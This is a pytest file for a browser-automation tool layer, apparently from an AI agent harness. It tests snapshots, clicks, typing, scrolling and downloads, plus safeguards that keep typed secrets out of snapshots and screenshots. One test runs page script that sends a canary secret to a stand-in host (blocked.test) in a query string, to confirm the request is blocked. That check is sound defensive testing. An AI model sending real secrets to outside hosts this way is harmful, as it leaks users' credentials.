import asyncio
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import threading

import pytest
from playwright.async_api import async_playwright

from harness.tools.browser import BrowserTools
from harness.tools.browser import SNAPSHOT_SCRIPT


HTML = b'''<!doctype html><title>Sandbox form</title>
<label>Name <input name="name"></label><label>Password <input type="password" name="password"></label>
<label>Choice <select><option value="a">Alpha</option><option value="b">Beta</option></select></label>
<button onclick="document.querySelector('input').outerHTML='<input name=&quot;name&quot;>'; document.querySelector('#status').textContent='Saved'">Save</button>
<p id="status">Ready</p>'''


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML)
    def log_message(self, *args):
        pass


@pytest.mark.asyncio
async def test_browser_real_dom_refs_actions_and_masked_screenshot(tmp_path,monkeypatch):
    server = ThreadingHTTPServer(('127.0.0.1', 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, channel='chromium')
            page = await browser.new_page()
            tools = BrowserTools(page, artifact_dir=tmp_path)
            snapshot = await tools.goto(f'http://127.0.0.1:{server.server_port}')
            refs = {e['name']: e['ref'] for e in snapshot['elements']}
            before_hash = (await tools.screenshot())['state_hash']
            await tools.type(refs['Name'], 'CANARY-SECRET')
            await tools.type(refs['Password'], 'PASSWORD-CANARY')
            snapshot = await tools.snapshot()
            assert 'CANARY-SECRET' not in str(snapshot)
            await page.evaluate("() => {let e=document.createElement('p');e.textContent='Public search suggestion';document.body.append(e)}")
            await tools.type(refs['Name'], 'Public search suggestion', private=False)
            assert 'Public search suggestion' in (await tools.snapshot())['text']
            assert 'Public search suggestion' not in tools._secret_values
            forced=await tools.type(refs['Password'], 'FORCED-PRIVATE-CANARY', private=False)
            assert forced['private'] is True
            assert 'FORCED-PRIVATE-CANARY' in tools._secret_values
            await page.evaluate("() => fetch('https://blocked.test/api?secret=QUERY-CANARY').catch(() => null)")
            snapshot=await tools.snapshot()
            assert snapshot['network']['blocked_hosts']==['blocked.test']
            assert 'QUERY-CANARY' not in str(snapshot)
            await page.route('**/diagnostic-failure*', lambda route: route.fulfill(status=503, body='Temporary failure'))
            await page.evaluate("() => fetch('/diagnostic-failure?private=QUERY-CANARY')")
            snapshot=await tools.snapshot()
            assert snapshot['network']['failed_requests'][-1]=={'host':'127.0.0.1','status':503}
            assert 'QUERY-CANARY' not in str(snapshot)
            await page.evaluate("() => document.querySelector('input').onkeyup = e => document.querySelector('#status').textContent = 'Key events received'")
            await tools.type(refs['Name'], 'Public keyboard query', private=False, sequential=True)
            assert 'Key events received' in (await tools.snapshot())['text']
            await page.evaluate("() => {let e=document.createElement('ul');e.innerHTML='<li>Public option</li>';e.onclick=()=>document.querySelector('#status').textContent='Option selected';document.body.append(e)}")
            snapshot=await tools.snapshot()
            option=next(e for e in snapshot['elements'] if e['role']=='li' and e['name']=='Public option')
            assert option['rect']['width']>0 and option['readonly'] is False
            await tools.click(option['ref'])
            assert 'Option selected' in (await tools.snapshot())['text']
            from harness.tools.secrets import SecretTools
            from harness.log.redact import Redactor
            monkeypatch.setenv('TEST_PRIVATE_KEYUP','PRIVATE-KEYUP-CANARY')
            await page.evaluate("() => document.querySelector('input[type=password]').onkeyup = e => document.querySelector('#status').textContent=e.target.value")
            redactor=Redactor()
            inserted=await SecretTools(tools,redactor).insert('TEST_PRIVATE_KEYUP','label:Password',sequential=True)
            assert inserted=={'inserted':True}
            assert 'PRIVATE-KEYUP-CANARY' not in str(await tools.snapshot())
            assert redactor.redact('PRIVATE-KEYUP-CANARY')=='[REDACTED]'
            assert before_hash != (await tools.screenshot())['state_hash']
            await tools.select(refs['Choice'], 'b')
            evidence = await tools.screenshot()
            assert len(evidence['state_hash']) == 64
            from PIL import Image
            img = Image.open(evidence['screenshot'])
            # Password field center is masked, not merely rendered with dots.
            rect = await page.get_by_label('Password').bounding_box()
            assert img.getpixel((int(rect['x']+rect['width']/2), int(rect['y']+rect['height']/2)))[:3] == (32, 41, 56)
            await tools.click(refs['Save'])
            await tools.wait_for(text='Saved')
            again = await tools.snapshot()
            assert next(e['ref'] for e in again['elements'] if e['name'] == 'Name') == refs['Name']
            await tools.type(refs['Name'], 'replacement')
            assert await page.get_by_label('Name').input_value() == 'replacement'
            await tools.type('label:Name', 'semantic value')
            await tools.click('text:Save')
            assert 'Saved' in (await tools.snapshot())['text']
            rect = await page.get_by_text('Save', exact=True).bounding_box()
            await tools.click_at(int(rect['x']+rect['width']/2), int(rect['y']+rect['height']/2))
            with pytest.raises(ValueError, match='within the current viewport'):
                await tools.click_at(-1, 10)
            with pytest.raises(PermissionError):
                await tools.goto('https://example.com')
            with pytest.raises(ValueError):
                await tools.click('invalid')
            await browser.close()
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


async def test_observed_image_capture_document_download_and_page_pdf(tmp_path):
    from pathlib import Path
    from pypdf import PdfReader
    import io
    async with async_playwright() as p:
        chromium = await p.chromium.launch(headless=True)
        try:
            page = await chromium.new_page()
            tools = BrowserTools(page, artifact_dir=tmp_path/'steps')
            async def fixture(route):
                if route.request.url.endswith('/ticket.pdf'):
                    await route.fulfill(body=b'%PDF-fixture-download', content_type='application/pdf',
                                        headers={'Content-Disposition':'attachment; filename="ticket.pdf"'})
                else:
                    await route.fulfill(content_type='text/html', body='''<h1>Fictional ticket confirmed</h1>
                    <p>PNR MOCK-ONLY</p><canvas aria-label="Fictional payment image" width="120" height="120"></canvas>
                    <input aria-label="Private field" value="PRIVATE-CANARY"><a href="/ticket.pdf">Download ticket</a>''')
            await page.route('http://localhost/**', fixture)
            snap = await tools.goto('http://localhost/')
            ref = next(e['ref'] for e in snap['elements'] if e['name']=='Fictional payment image')
            image = await tools.capture_element(ref)
            from PIL import Image
            # Chromium rounds fractional CSS coordinates outwards when clipping.
            assert all(120 <= size <= 121 for size in Image.open(image['screenshot']).size)
            with pytest.raises(ValueError, match='image or canvas'):
                await tools.capture_element('label:Private field')
            downloaded = await tools.download('text:Download ticket')
            assert Path(downloaded['path']).parent == tmp_path/'steps'/'downloads'
            assert Path(downloaded['path']).read_bytes() == b'%PDF-fixture-download'
            printed = await tools.print_pdf()
            text = ''.join(p.extract_text() for p in PdfReader(io.BytesIO(Path(printed['path']).read_bytes())).pages)
            assert 'Fictional ticket confirmed' in text and 'MOCK-ONLY' in text
        finally:
            await chromium.close()


async def test_snapshot_bounds_visible_controls_and_removes_stale_refs(tmp_path):
    async with async_playwright() as p:
        chromium=await p.chromium.launch(headless=True)
        try:
            page=await chromium.new_page(viewport={'width':800,'height':600})
            tools=BrowserTools(page,artifact_dir=tmp_path)
            await page.set_content('<button>At top</button><div style="margin-top:3000px"><button>At bottom</button></div>')
            before=await tools.snapshot()
            top=next(e['ref'] for e in before['elements'] if e['name']=='At top')
            assert not any(e['name']=='At bottom' for e in before['elements'])
            assert 'At top' in before['viewport_text'] and 'At bottom' not in before['viewport_text']
            await page.get_by_text('At bottom',exact=True).scroll_into_view_if_needed()
            after=await tools.snapshot()
            assert any(e['name']=='At bottom' for e in after['elements'])
            assert 'At bottom' in after['viewport_text'] and 'At top' not in after['viewport_text']
            assert await page.locator(f'[data-harness-ref="{top}"]').count()==0
            await page.set_content(''.join(f'<button style="position:fixed;top:0;left:0">Dense {i}</button>' for i in range(250)))
            dense=await tools.snapshot()
            assert len(dense['elements'])==200 and dense['elements_truncated'] is True
            assert 'value' not in dense['elements'][0]
        finally:
            await chromium.close()


@pytest.mark.asyncio
async def test_snapshot_tolerates_missing_body_and_retries_navigation_race(tmp_path):
    async with async_playwright() as p:
        chromium=await p.chromium.launch(headless=True)
        try:
            page=await chromium.new_page()
            await page.set_content('<!doctype html><html><head><title>Loading</title></head><body><button>Ready</button></body></html>')
            tools=BrowserTools(page,artifact_dir=tmp_path)

            await page.evaluate('() => document.body.remove()')
            bodyless=await tools.snapshot()
            assert bodyless['body_missing'] is True
            assert bodyless['text']=='' and bodyless['elements']==[]

            await page.set_content('<!doctype html><html><body><button>After navigation</button></body></html>')
            real_evaluate=page.evaluate
            calls={'snapshot':0}

            class NavigationRacePage:
                context=page.context

                @property
                def url(self):
                    return page.url

                async def evaluate(self, expression):
                    if expression==SNAPSHOT_SCRIPT and calls['snapshot']==0:
                        calls['snapshot']+=1
                        raise RuntimeError('Page.evaluate: Execution context was destroyed, most likely because of a navigation')
                    if expression==SNAPSHOT_SCRIPT:
                        calls['snapshot']+=1
                    return await real_evaluate(expression)

            tools.page=NavigationRacePage()
            recovered=await tools.snapshot()
            assert calls['snapshot']==2
            assert any(e['name']=='After navigation' for e in recovered['elements'])
        finally:
            await chromium.close()


async def test_scroll_uses_pixels_and_targets_nested_content_panel(tmp_path):
    async with async_playwright() as p:
        chromium=await p.chromium.launch(headless=True)
        try:
            page=await chromium.new_page(viewport={'width':800,'height':600})
            tools=BrowserTools(page,artifact_dir=tmp_path)
            await page.set_content('''<style>body{margin:0;overflow:hidden}header{height:80px}
                #panel{margin-left:30%;height:500px;overflow:auto}</style><header>Fixed header</header>
                <div id="panel"><div style="height:2500px">Scrollable results</div></div>''')
            await tools.scroll(500)
            first=await page.locator('#panel').evaluate('(e) => e.scrollTop')
            assert first>=450
            await tools.scroll(-200,x=600,y=200)
            second=await page.locator('#panel').evaluate('(e) => e.scrollTop')
            assert 150 <= first-second <= 250
            with pytest.raises(ValueError): await tools.scroll(500,x=10)
        finally:
            await chromium.close()
